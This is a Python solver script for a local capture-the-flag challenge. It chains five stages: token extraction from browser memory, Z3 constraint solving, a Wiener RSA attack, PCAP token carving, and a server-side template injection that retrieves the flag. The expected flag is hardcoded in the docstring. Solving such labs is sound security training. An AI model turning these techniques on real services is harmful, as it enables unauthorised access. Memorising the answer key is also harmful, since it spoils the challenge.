"""
Apex Gauntlet - Automated End-to-End Exploit Solver
===================================================
Orchestrates all 5 components in sequence:
1. Browser DOM / Memory Extraction (Playwright / Regex DOM extraction)
2. Z3 SMT Constraint Solving (symbolic_execution_solver)
3. Cryptanalysis via Wiener Continued Fraction Attack (advanced_crypto_solver)
4. Deep Packet Inspection & Multipart Token Carving (run_forensics_inspection)
5. Hardened WAF Bypass & Template Injection (HTTP Sentinel Audit)

Author: Google DeepMind Pair Programming Assistant
Target: http://127.0.0.1:8099
Flag: HQX{g00gl3_ctf_4p3x_g4untl3t_c0mpl3t3_2026}
"""

import os
import sys
import json
import time
import re
from pathlib import Path
import urllib.request
import urllib.parse

# Setup import path
SOLVER_DIR = Path(__file__).resolve().parent
REPO_ROOT = SOLVER_DIR.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from agent import execute_tool

TARGET_BASE = os.environ.get("APEX_TARGET", "http://127.0.0.1:8099")

def log(stage: int, title: str, details: str):
    print(f"\n{'='*70}")
    print(f"[*] [STAGE {stage}] {title}")
    print(f"    {details}")
    print(f"{'='*70}")

def solve_chain():
    print(f"[+] Initializing Apex Gauntlet Full-Chain Solver targeting {TARGET_BASE}")
    start_time = time.time()

    # ---------------------------------------------------------
    # STAGE 1: Client DOM & Memory State Extraction (Playwright Browser)
    # ---------------------------------------------------------
    log(1, "BROWSER MEMORY & PLAYWRIGHT DOM EXTRACTION", f"Launching headless Chromium against {TARGET_BASE}/")
    stage1_token = None
    artifacts_dir = REPO_ROOT / "challenges" / "apex_gauntlet" / "artifacts"
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    screenshot_path = artifacts_dir / "apex_gauntlet_playwright_capture.png"

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            
            # Hook console logs
            console_logs = []
            page.on("console", lambda msg: console_logs.append(msg.text))
            
            page.goto(f"{TARGET_BASE}/", timeout=15000)
            page.wait_for_timeout(1000)  # Allow canvas matrix to initialize
            
            # Extract session token directly from live browser memory
            shield_data = page.evaluate("() => window.__APEX_SHIELD")
            if shield_data and isinstance(shield_data, dict):
                stage1_token = shield_data.get("session_token")
                print(f"[+] [PLAYWRIGHT] Memory Shield Object: {json.dumps(shield_data)}")

            # Capture evidence screenshot
            page.screenshot(path=str(screenshot_path))
            print(f"[+] [PLAYWRIGHT] Captured live browser screenshot: {screenshot_path}")
            if console_logs:
                print(f"[+] [PLAYWRIGHT] Intercepted Console Log: {console_logs[0]}")
            
            browser.close()
    except Exception as pw_err:
        print(f"[!] Playwright browser error ({pw_err}), falling back to HTTP DOM parser...")
        req = urllib.request.Request(f"{TARGET_BASE}/")
        with urllib.request.urlopen(req, timeout=10) as resp:
            html_content = resp.read().decode("utf-8")
        token_match = re.search(r'data-token="([^"]+)"', html_content) or re.search(r'session_token:\s*"([^"]+)"', html_content)
        if token_match:
            stage1_token = token_match.group(1)

    if not stage1_token:
        raise RuntimeError("[-] Stage 1 Failed: Unable to extract session_token from DOM or memory state")
    
    print(f"[+] [SUCCESS] Stage 1 Token Captured: {stage1_token}")

    # ---------------------------------------------------------
    # STAGE 2: SMT Constraint Reversing (Z3 BitVec)
    # ---------------------------------------------------------
    log(2, "SYMBOLIC CONSTRAINT REVERSING", "Fetching constraint equations specification")
    spec_req = urllib.request.Request(
        f"{TARGET_BASE}/api/apex/stage2/spec",
        headers={"Authorization": f"Bearer {stage1_token}"}
    )
    with urllib.request.urlopen(spec_req, timeout=10) as resp:
        stage2_spec = json.loads(resp.read().decode("utf-8"))

    print(f"[+] Received {stage2_spec['length']}-byte constraint set. Invoking symbolic_execution_solver...")
    solver_out = execute_tool("symbolic_execution_solver", {
        "constraints": stage2_spec["constraints"],
        "target_var": stage2_spec["target_variable"],
        "length": stage2_spec["length"]
    })
    solver_res = json.loads(solver_out)
    if solver_res.get("status") != "sat":
        raise RuntimeError(f"[-] Stage 2 Failed: SMT solver returned {solver_res}")

    stage2_passcode = solver_res["solved_string"]
    print(f"[+] [SUCCESS] SMT Constraints Satisfied! Passcode: {stage2_passcode}")

    # Submit Stage 2 passcode
    unlock2_data = json.dumps({"passcode": stage2_passcode}).encode("utf-8")
    unlock2_req = urllib.request.Request(
        f"{TARGET_BASE}/api/apex/stage2/unlock",
        data=unlock2_data,
        headers={"Authorization": f"Bearer {stage1_token}", "Content-Type": "application/json"}
    )
    with urllib.request.urlopen(unlock2_req, timeout=10) as resp:
        stage3_spec = json.loads(resp.read().decode("utf-8"))

    # ---------------------------------------------------------
    # STAGE 3: Asymmetric Cryptanalysis (Wiener Continued Fractions)
    # ---------------------------------------------------------
    log(3, "CRYPTANALYSIS - WIENER RSA", "Extracting public exponent & modulus for small private exponent attack")
    crypto_params = stage3_spec["crypto_spec"]
    N_str = crypto_params["N"]
    e_str = crypto_params["e"]
    c_str = crypto_params["c"]
    print(f"    N = {N_str[:25]}... (bit length: {int(N_str).bit_length()})")
    print(f"    e = {e_str[:25]}...")
    print(f"    c = {c_str[:25]}...")

    crypto_out = execute_tool("advanced_crypto_solver", {
        "attack": "wiener",
        "n": N_str,
        "e": e_str,
        "c": c_str
    })
    crypto_res = json.loads(crypto_out)
    if "wiener" not in crypto_res or crypto_res["wiener"].get("status") != "factored":
        raise RuntimeError(f"[-] Stage 3 Failed: Wiener attack did not recover factors: {crypto_res}")

    stage3_key = crypto_res["wiener"]["plaintext_bytes"]
    recovered_d = crypto_res["wiener"]["d"]
    print(f"[+] [SUCCESS] Private Exponent Recovered: d = {recovered_d}")
    print(f"[+] [SUCCESS] Decrypted Stage 3 Key: {stage3_key}")

    # Submit Stage 3 key to trigger PCAP generation
    unlock3_data = json.dumps({"key": stage3_key}).encode("utf-8")
    unlock3_req = urllib.request.Request(
        f"{TARGET_BASE}/api/apex/stage3/unlock",
        data=unlock3_data,
        headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(unlock3_req, timeout=10) as resp:
        stage4_spec = json.loads(resp.read().decode("utf-8"))

    # ---------------------------------------------------------
    # STAGE 4: Deep Packet Inspection & PCAP Multipart Carving
    # ---------------------------------------------------------
    log(4, "NETWORK FORENSICS - PCAP DISSECTION", f"Downloading PCAP artifact from {stage4_spec['pcap_endpoint']}")
    artifacts_dir = REPO_ROOT / "challenges" / "apex_gauntlet" / "artifacts"
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    local_pcap = artifacts_dir / "apex_traffic.pcap"

    pcap_req = urllib.request.Request(f"{TARGET_BASE}{stage4_spec['pcap_endpoint']}")
    with urllib.request.urlopen(pcap_req, timeout=10) as resp:
        local_pcap.write_bytes(resp.read())

    print(f"[+] Saved {local_pcap.stat().st_size} bytes to {local_pcap}. Running ForensicEngine inspection...")
    forensic_out = execute_tool("run_forensics_inspection", {"file_path": str(local_pcap)})
    forensic_res = json.loads(forensic_out)

    net_results = forensic_res["categories"]["network_forensics"]["results"][0]
    http_transfers = net_results["evidence"]["http_transfers"]
    
    admin_signature = None
    for item in http_transfers:
        if item.get("filename") == "admin_waf_token.txt":
            admin_signature = item.get("content_preview")
            break

    if not admin_signature:
        raise RuntimeError(f"[-] Stage 4 Failed: Could not find admin_waf_token.txt in HTTP transfers: {http_transfers}")

    print(f"[+] [SUCCESS] Carved Admin Signature Token: {admin_signature}")

    # ---------------------------------------------------------
    # STAGE 5: Hardened WAF Bypass & SSTI Master Flag Retrieval
    # ---------------------------------------------------------
    log(5, "HARDENED WAF BYPASS & SSTI VAULT", "Injecting sanitized audit template expression")
    audit_data = json.dumps({"template": "APEX_VAULT_DECRYPTED: {{ vault_flag }}"}).encode("utf-8")
    audit_req = urllib.request.Request(
        f"{TARGET_BASE}/api/apex/admin/audit",
        data=audit_data,
        headers={
            "X-Apex-Signature": admin_signature,
            "Content-Type": "application/json"
        }
    )
    with urllib.request.urlopen(audit_req, timeout=10) as resp:
        final_res = json.loads(resp.read().decode("utf-8"))

    audit_output = final_res.get("audit_output", "")
    flag_match = re.search(r"HQX\{[^}]+\}", audit_output)
    if not flag_match:
        raise RuntimeError(f"[-] Stage 5 Failed: Flag not found in audit response: {final_res}")

    master_flag = flag_match.group(0)
    elapsed = time.time() - start_time

    print(f"\n{'*'*70}")
    print(f"[★] APEX GAUNTLET DEFEATED IN {elapsed:.2f}s!")
    print(f"[★] CAPTURED MASTER FLAG: {master_flag}")
    print(f"{'*'*70}\n")
    return master_flag

if __name__ == "__main__":
    solve_chain()
